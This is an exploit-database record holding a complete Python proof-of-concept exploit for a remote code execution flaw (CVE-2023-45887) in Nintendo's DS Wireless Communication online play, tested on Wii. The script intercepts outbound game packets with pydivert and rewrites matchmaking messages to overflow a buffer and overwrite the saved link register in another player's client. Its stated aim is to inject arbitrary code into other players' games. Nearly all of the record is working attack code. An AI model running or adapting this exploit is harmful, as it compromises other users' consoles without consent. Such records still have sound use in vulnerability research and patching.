{"source": "https://www.exploit-db.com/exploits/51798", "vulnName": "DS Wireless Communication - Remote Code Execution", "vulnEDBID": "51798", "vulnCVE": "N/A", "author": "MIKEISASTAR", "exploitType": "LOCAL", "platform": "HARDWARE", "datePublished": "2024-02-15", "vulnContent": "# Exploit Title: DS Wireless Communication Remote Code Execution\n# Date: 11 Oct 2023\n# Exploit Author: MikeIsAStar\n# Vendor Homepage: https://www.nintendo.com\n# Version: Unknown\n# Tested on: Wii\n# CVE: CVE-2023-45887\n\n\"\"\"This code will inject arbitrary code into a client's game.\n\nYou are fully responsible for all activity that occurs while using this code.\nThe author of this code can not be held liable to you or to anyone else as a\nresult of damages caused by the usage of this code.\n\"\"\"\n\nimport re\nimport sys\n\ntry:\n    import pydivert\nexcept ModuleNotFoundError:\n    sys.exit(\"The 'pydivert' module is not installed !\")\n\n\n# Variables\nLR_SAVE = b'\\x41\\x41\\x41\\x41'\nassert len(LR_SAVE) == 0x04\nPADDING = b'MikeStar'\nassert len(PADDING) > 0x00\n\n# Constants\nDWC_MATCH_COMMAND_INVALID = b'\\xFE'\nPADDING_LENGTH = 0x23C\nFINAL_KEY = b'\\\\final\\\\'\nWINDIVERT_FILTER = 'outbound and tcp and tcp.PayloadLength > 0'\n\n\ndef try_modify_payload(payload):\n    message_pattern = rb'\\\\msg\\\\GPCM([1-9][0-9]?)vMAT'\n    message = re.search(message_pattern, payload)\n    if not message:\n        return None\n\n    payload = payload[:message.end()]\n    payload += DWC_MATCH_COMMAND_INVALID\n    payload += (PADDING * (PADDING_LENGTH // len(PADDING) + 1))[:PADDING_LENGTH]\n    payload += LR_SAVE\n    payload += FINAL_KEY\n    return payload\n\n\ndef main():\n    try:\n        with pydivert.WinDivert(WINDIVERT_FILTER) as packet_buffer:\n            for packet in packet_buffer:\n                payload = try_modify_payload(packet.payload)\n                if payload is not None:\n                    print('Modified a GPCM message !')\n                    packet.payload = payload\n                packet_buffer.send(packet)\n    except KeyboardInterrupt:\n        pass\n    except PermissionError:\n        sys.exit('This program must be run with administrator privileges !')\n\n\nif __name__ == '__main__':\n    main()\n            "}